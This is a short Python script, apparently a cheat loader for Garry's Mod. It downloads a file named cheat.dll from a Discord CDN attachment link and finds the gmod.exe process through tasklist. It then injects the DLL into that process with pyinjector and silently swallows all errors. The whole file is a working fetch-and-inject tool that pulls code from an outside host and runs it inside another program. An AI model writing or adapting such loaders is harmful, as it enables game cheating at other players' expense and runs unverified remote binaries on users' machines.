import re, sys, os, time
import tempfile
import requests

from subprocess import check_output
from pyinjector import inject


def log(string: str):
    print(string)
    time.sleep(2)
    sys.exit(0)


class Injector:
    def __init__(self, filename: str):
        self.filename = filename

    def get_process_running(self, executable: str = "gmod.exe"):
        tasks = check_output(['tasklist']).decode('cp866', 'ignore').split("\r\n")
        processes = []
        for task in tasks:
            m = re.match(b'(.*?)\\s+(\\d+)\\s+(\\w+)\\s+(\\w+)\\s+(.*?)\\s.*', task.encode())
            if m is not None:
                processes.append(
                    {
                        "image": m.group(1).decode(),
                        "pid": int(m.group(2).decode()),
                        "session_name": m.group(3).decode(),
                        "session_num": int(m.group(4).decode()),
                        "mem_usage": int(m.group(5).decode('ascii', 'ignore'))
                    }
                )

        for process in processes:
            if process['image'] == executable:
                return process['pid']

    def inject(self):
        process = self.get_process_running()

        if process is not None:
            try:
                inject(process, self.filename)
            except:
                log('An unexpected error occured...')
        else:
            log('Game not found...')
        log('Injected Successfully !')


url = "https://cdn.discordapp.com/attachments/1037817329611980844/1217547070446108732/cheat.dll?ex=660da692&is=65fb3192&hm=8bfccbe67ee62f7b6f39073b7962c60974a6b0dfb719088e2c3456ff4171b05e&"
try:
    with tempfile.TemporaryDirectory() as directory:
        response = requests.get(url, allow_redirects=True)
        open(f'{directory}/cheat.dll', "wb").write(response.content)

        injector = Injector(filename=f'{directory}/cheat.dll')
        injector.inject()
except:
    pass
